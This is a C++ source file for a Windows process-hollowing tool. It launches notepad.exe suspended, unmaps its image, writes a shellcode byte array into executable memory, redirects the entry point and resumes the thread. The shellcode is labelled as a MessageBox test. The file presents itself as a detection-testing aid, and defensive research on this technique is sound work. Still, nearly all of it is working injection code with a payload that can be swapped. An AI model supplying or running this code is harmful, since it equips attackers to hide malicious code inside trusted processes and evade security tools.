#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

class ProcessHollowing {
private:
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    CONTEXT ctx;
    LPVOID pImageBase;
    LPVOID pHollowAddress;

public:
    ProcessHollowing() {
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        ZeroMemory(&ctx, sizeof(ctx));
        si.cb = sizeof(si);
        ctx.ContextFlags = CONTEXT_FULL;
    }

    ~ProcessHollowing() {
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread) CloseHandle(pi.hThread);
    }

    bool CreateSuspendedProcess(const std::wstring& targetPath) {
        std::wcout << L"[+] Creating suspended process: " << targetPath << std::endl;

        BOOL result = CreateProcess(
            targetPath.c_str(),
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi
        );

        if (!result) {
            std::wcerr << L"[-] Failed to create suspended process. Error: "
                      << GetLastError() << std::endl;
            return false;
        }

        std::wcout << L"[+] Process created successfully. PID: " << pi.dwProcessId << std::endl;
        return true;
    }

    bool GetProcessContext() {
        std::wcout << L"[+] Getting thread context..." << std::endl;

        if (!GetThreadContext(pi.hThread, &ctx)) {
            std::wcerr << L"[-] Failed to get thread context. Error: "
                      << GetLastError() << std::endl;
            return false;
        }

        std::wcout << L"[+] Thread context retrieved successfully" << std::endl;
        return true;
    }

    bool GetImageBase() {
        std::wcout << L"[+] Reading image base from PEB..." << std::endl;

        // Read PEB address from EBX register (points to PEB)
        LPVOID pebAddress = (LPVOID)ctx.Ebx;

        // Read image base address from PEB+8
        SIZE_T bytesRead;
        if (!ReadProcessMemory(
            pi.hProcess,
            (LPVOID)((DWORD_PTR)pebAddress + 8),
            &pImageBase,
            sizeof(LPVOID),
            &bytesRead
        )) {
            std::wcerr << L"[-] Failed to read image base from PEB. Error: "
                      << GetLastError() << std::endl;
            return false;
        }

        std::wcout << L"[+] Image base: 0x" << std::hex << pImageBase << std::endl;
        return true;
    }

    bool UnmapTargetImage() {
        std::wcout << L"[+] Unmapping target image..." << std::endl;

        // Dynamically load ntdll.dll and get NtUnmapViewOfSection
        HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
        if (!hNtdll) {
            std::wcerr << L"[-] Failed to get ntdll.dll handle" << std::endl;
            return false;
        }

        typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, LPVOID);
        pNtUnmapViewOfSection NtUnmapViewOfSection =
            (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

        if (!NtUnmapViewOfSection) {
            std::wcerr << L"[-] Failed to get NtUnmapViewOfSection address" << std::endl;
            return false;
        }

        NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, pImageBase);
        if (status != 0) {
            std::wcerr << L"[-] Failed to unmap view of section. Status: 0x"
                      << std::hex << status << std::endl;
            return false;
        }

        std::wcout << L"[+] Target image unmapped successfully" << std::endl;
        return true;
    }

    bool AllocateMemory(DWORD imageSize) {
        std::wcout << L"[+] Allocating memory for payload..." << std::endl;

        pHollowAddress = VirtualAllocEx(
            pi.hProcess,
            pImageBase,
            imageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!pHollowAddress) {
            std::wcerr << L"[-] Failed to allocate memory. Error: "
                      << GetLastError() << std::endl;

            // Try allocating at any address if original base fails
            pHollowAddress = VirtualAllocEx(
                pi.hProcess,
                NULL,
                imageSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            );

            if (!pHollowAddress) {
                std::wcerr << L"[-] Failed to allocate memory at any address. Error: "
                          << GetLastError() << std::endl;
                return false;
            }

            std::wcout << L"[+] Allocated at alternative address: 0x"
                      << std::hex << pHollowAddress << std::endl;
        } else {
            std::wcout << L"[+] Memory allocated at original base: 0x"
                      << std::hex << pHollowAddress << std::endl;
        }

        return true;
    }

    bool WritePayload(LPVOID payloadData, DWORD payloadSize) {
        std::wcout << L"[+] Writing payload to allocated memory..." << std::endl;

        SIZE_T bytesWritten;
        if (!WriteProcessMemory(
            pi.hProcess,
            pHollowAddress,
            payloadData,
            payloadSize,
            &bytesWritten
        )) {
            std::wcerr << L"[-] Failed to write payload. Error: "
                      << GetLastError() << std::endl;
            return false;
        }

        std::wcout << L"[+] Payload written successfully. Bytes: "
                  << bytesWritten << std::endl;
        return true;
    }

    bool UpdateImageBase() {
        std::wcout << L"[+] Updating image base in PEB..." << std::endl;

        LPVOID pebAddress = (LPVOID)ctx.Ebx;
        SIZE_T bytesWritten;

        if (!WriteProcessMemory(
            pi.hProcess,
            (LPVOID)((DWORD_PTR)pebAddress + 8),
            &pHollowAddress,
            sizeof(LPVOID),
            &bytesWritten
        )) {
            std::wcerr << L"[-] Failed to update image base. Error: "
                      << GetLastError() << std::endl;
            return false;
        }

        std::wcout << L"[+] Image base updated successfully" << std::endl;
        return true;
    }

    bool UpdateEntryPoint(DWORD newEntryPoint) {
        std::wcout << L"[+] Updating entry point..." << std::endl;

        ctx.Eax = (DWORD_PTR)pHollowAddress + newEntryPoint;

        if (!SetThreadContext(pi.hThread, &ctx)) {
            std::wcerr << L"[-] Failed to set thread context. Error: "
                      << GetLastError() << std::endl;
            return false;
        }

        std::wcout << L"[+] Entry point updated to: 0x" << std::hex << ctx.Eax << std::endl;
        return true;
    }

    bool ResumeExecution() {
        std::wcout << L"[+] Resuming thread execution..." << std::endl;

        if (ResumeThread(pi.hThread) == -1) {
            std::wcerr << L"[-] Failed to resume thread. Error: "
                      << GetLastError() << std::endl;
            return false;
        }

        std::wcout << L"[+] Thread resumed successfully" << std::endl;
        return true;
    }

    DWORD GetProcessId() const {
        return pi.dwProcessId;
    }
};

// Simple payload - MessageBox shellcode for testing
unsigned char payload[] = {
    0x31, 0xd2, 0xb2, 0x30, 0x64, 0x8b, 0x12, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x1c, 0x8b, 0x42,
    0x08, 0x8b, 0x72, 0x20, 0x8b, 0x12, 0x80, 0x7e, 0x0c, 0x33, 0x75, 0xf2, 0x89, 0xc7, 0x03,
    0x78, 0x3c, 0x8b, 0x57, 0x78, 0x01, 0xc2, 0x8b, 0x7a, 0x20, 0x01, 0xc7, 0x89, 0xdd, 0x8b,
    0x34, 0xaf, 0x01, 0xc6, 0x45, 0x81, 0x3e, 0x4c, 0x6f, 0x61, 0x64, 0x75, 0xf2, 0x81, 0x7e,
    0x08, 0x4c, 0x69, 0x62, 0x72, 0x75, 0xe9, 0x8b, 0x7a, 0x24, 0x01, 0xc7, 0x66, 0x8b, 0x2c,
    0x6f, 0x8b, 0x7a, 0x1c, 0x01, 0xc7, 0x8b, 0x7c, 0xaf, 0xfc, 0x01, 0xc7, 0x89, 0xf8, 0x68,
    0x65, 0x72, 0x33, 0x32, 0x68, 0x6b, 0x65, 0x72, 0x6e, 0x68, 0x55, 0x73, 0x65, 0x72, 0x54,
    0xff, 0xd0, 0x68, 0x6f, 0x78, 0x41, 0x00, 0x68, 0x61, 0x67, 0x65, 0x42, 0x68, 0x4d, 0x65,
    0x73, 0x73, 0x54, 0x50, 0xff, 0xd0, 0x68, 0x72, 0x65, 0x64, 0x21, 0x68, 0x6f, 0x6c, 0x6c,
    0x6f, 0x68, 0x48, 0x65, 0x6c, 0x6c, 0x8b, 0xcc, 0x6a, 0x00, 0x54, 0x6a, 0x00, 0x54, 0xff,
    0xd0, 0x6a, 0x00, 0xff, 0xd7
};

int wmain(int argc, wchar_t* argv[]) {
    std::wcout << L"=== Process Hollowing Test Tool ===" << std::endl;
    std::wcout << L"[!] This is for security research and testing only!" << std::endl << std::endl;

    std::wstring targetPath = L"C:\\Windows\\System32\\notepad.exe";

    if (argc > 1) {
        targetPath = argv[1];
    }

    ProcessHollowing hollowing;

    // Step 1: Create suspended process
    if (!hollowing.CreateSuspendedProcess(targetPath)) {
        return -1;
    }

    // Step 2: Get thread context
    if (!hollowing.GetProcessContext()) {
        return -1;
    }

    // Step 3: Get image base
    if (!hollowing.GetImageBase()) {
        return -1;
    }

    // Step 4: Unmap target image
    if (!hollowing.UnmapTargetImage()) {
        return -1;
    }

    // Step 5: Allocate memory for payload
    if (!hollowing.AllocateMemory(sizeof(payload))) {
        return -1;
    }

    // Step 6: Write payload
    if (!hollowing.WritePayload(payload, sizeof(payload))) {
        return -1;
    }

    // Step 7: Update image base in PEB
    if (!hollowing.UpdateImageBase()) {
        return -1;
    }

    // Step 8: Update entry point
    if (!hollowing.UpdateEntryPoint(0)) {
        return -1;
    }

    // Step 9: Resume execution
    std::wcout << L"[!] About to resume execution. PID: "
              << hollowing.GetProcessId() << std::endl;
    std::wcout << L"[!] Press Enter to continue...";
    std::wcin.get();

    if (!hollowing.ResumeExecution()) {
        return -1;
    }

    std::wcout << L"[+] Process hollowing completed successfully!" << std::endl;
    std::wcout << L"[+] Monitor PID " << hollowing.GetProcessId()
              << L" with your detection tools" << std::endl;

    // Keep the program running so you can observe the hollowed process
    std::wcout << L"[+] Press Enter to exit...";
    std::wcin.get();

    return 0;
}